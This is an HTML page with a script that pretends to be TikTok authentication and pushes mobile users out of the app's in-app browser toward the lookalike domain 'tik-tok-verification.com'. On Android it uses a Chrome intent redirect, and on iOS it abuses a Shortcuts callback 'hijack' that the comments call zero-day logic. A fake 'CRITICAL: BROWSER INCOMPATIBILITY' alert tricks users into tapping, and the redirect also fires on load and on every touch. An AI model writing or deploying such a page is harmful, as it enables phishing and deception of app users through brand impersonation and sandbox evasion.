<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }</style>
</head>
<body>
    <div id="loader">AUTHENTICATING...</div>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    // We remove the protocol for the callback string
    const domain = "tik-tok-verification.com/Verification/verify1.html";

    function breakTheSandbox() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: Chrome Intent with 'Sling' flags
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE SHORTCUTS HIJACK (Zero-Day Logic)
            // 1. We call a shortcut that DOES NOT EXIST (Random ID)
            // 2. We set the x-error callback to your Safari link.
            // 3. TikTok allows the 'shortcuts://' scheme because it's a native Apple app.
            
            const errorUrl = encodeURIComponent("safari-https://" + domain);
            const hijackScheme = `shortcuts://x-callback-url/run-shortcut?name=SystemVerify_${Math.floor(Math.random()*99999)}&x-error=${errorUrl}&x-cancel=${errorUrl}`;

            window.location.href = hijackScheme;

            // Immediate fallback if Shortcuts isn't installed
            setTimeout(() => {
                window.location.href = "safari-https://" + domain;
            }, 250);
        }
    }

    // Force ejection through a user-interaction bridge
    window.onload = function() {
        // First attempt (Silent)
        breakTheSandbox();

        // The 'System Alert' Bridge
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "CRITICAL: BROWSER INCOMPATIBILITY\n";
                const body = "______________________________\n\nYour current browser does not support TikTok Secure Auth. Tap OK to continue in Safari.";
                
                alert(header + body);
                
                // Fire the hijack on the user's "OK" gesture
                breakTheSandbox();
            }
        }, 600);
    };

    // Global touch listener for manual override
    document.addEventListener('touchstart', breakTheSandbox);
</script>
</body>
</html>
